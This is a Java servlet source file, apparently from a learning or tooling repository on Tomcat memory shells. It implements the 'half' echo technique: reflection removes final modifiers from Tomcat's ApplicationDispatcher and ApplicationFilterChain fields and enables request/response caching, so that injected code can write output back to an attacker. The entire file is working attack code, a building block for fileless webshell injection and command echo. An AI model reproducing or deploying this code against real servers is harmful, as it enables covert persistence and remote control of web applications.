package com.tomcat.memshell.TomcatEcho;

import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;

@WebServlet("/demo2")
public class TomcatEcho_Half extends HttpServlet {
    protected void doPost(HttpServletRequest request, HttpServletResponse response) {
        try {
            Field wrap_same_object = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequest = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = Class.forName("org.apache.catalina.core.ApplicationFilterChain").getDeclaredField("lastServicedResponse");
            lastServicedRequest.setAccessible(true);
            lastServicedResponse.setAccessible(true);
            wrap_same_object.setAccessible(true);
            //修改final
            Field modifiersField = Field.class.getDeclaredField("modifiers");
            modifiersField.setAccessible(true);
            modifiersField.setInt(wrap_same_object, wrap_same_object.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~Modifier.FINAL);
            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~Modifier.FINAL);

            boolean wrap_same_object1 = wrap_same_object.getBoolean(null);
            ThreadLocal<ServletRequest> requestThreadLocal = (ThreadLocal<ServletRequest>)lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> responseThreadLocal = (ThreadLocal<ServletResponse>)lastServicedResponse.get(null);

            wrap_same_object.setBoolean(null,true);
            lastServicedRequest.set(null,new ThreadLocal<>());
            lastServicedResponse.set(null,new ThreadLocal<>());
            ServletResponse servletResponse = responseThreadLocal.get();
            servletResponse.getWriter().write("TomcatEcho_Half injection successful!");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        this.doPost(request, response);

    }
}
